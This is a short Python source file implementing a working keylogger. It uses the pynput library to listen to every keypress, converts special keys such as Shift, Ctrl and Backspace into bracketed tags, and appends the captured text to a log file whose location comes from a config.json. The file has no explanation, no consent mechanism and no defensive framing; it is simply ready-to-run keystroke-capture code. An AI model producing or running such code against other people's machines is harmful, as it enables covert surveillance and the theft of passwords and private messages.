import json
from pathlib import Path
import pynput

SCRIPT_DIR = Path.cwd()
CONFIG_PATH = SCRIPT_DIR / "config.json"

with open(CONFIG_PATH, "r") as config_file:
    config = json.load(config_file)

flush_on_delimiter = config["flush_on_delimiter"]
new_line_per_delimiter = config["new_line_per_delimiter"]
output_dir = config["output_directory"] 
if output_dir:
    Path(output_dir).mkdir(parents=True, exist_ok=True)
    output_dir=Path(output_dir)
else: output_dir=SCRIPT_DIR
    
log_file_path = output_dir / config["filename"]
keyboard = pynput.keyboard
SpecialKey = keyboard.Key
key_buffer = []
DELIMITER_KEYS = (SpecialKey.backspace, SpecialKey.space, SpecialKey.enter, SpecialKey.esc, SpecialKey.cmd)
KEY_MAP = {
    SpecialKey.space: " ",
    SpecialKey.enter: "\n",
    SpecialKey.backspace: " [BACKSPACE] ",
    SpecialKey.tab: " [TAB] ",
    SpecialKey.caps_lock: " [CAPS_LOCK] ",
    SpecialKey.shift: " [SHIFT] ",
    SpecialKey.shift_r: " [SHIFT] ",
    SpecialKey.ctrl: " [CTRL] ",
    SpecialKey.ctrl_r: " [CTRL] ",
    SpecialKey.alt: " [ALT] ",
    SpecialKey.alt_gr: " [ALT] ",
    SpecialKey.delete: " [DELETE] ",
    SpecialKey.esc: " [ESC] ",
}

def convert_key_to_str(key) -> str:
    if key in KEY_MAP:
        return KEY_MAP[key]
        
    if hasattr(key, "char") and key.char is not None:
        return key.char
        
    key_name = str(key).replace("Key.", "").upper()
    return f" [{key_name}] "

def save_to_log(text_data: str):
    with open(log_file_path, "a") as file:
        file.write(text_data)

def on_press(key):
    global key_buffer
    
    key_str = convert_key_to_str(key)
    key_buffer.append(key_str)

    if flush_on_delimiter and (key not in DELIMITER_KEYS):
        return  

    if new_line_per_delimiter:
        key_buffer.append("\n")
        
    log_payload = "".join(key_buffer)
    save_to_log(log_payload)

    if new_line_per_delimiter or not flush_on_delimiter:
        key_buffer.clear()

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

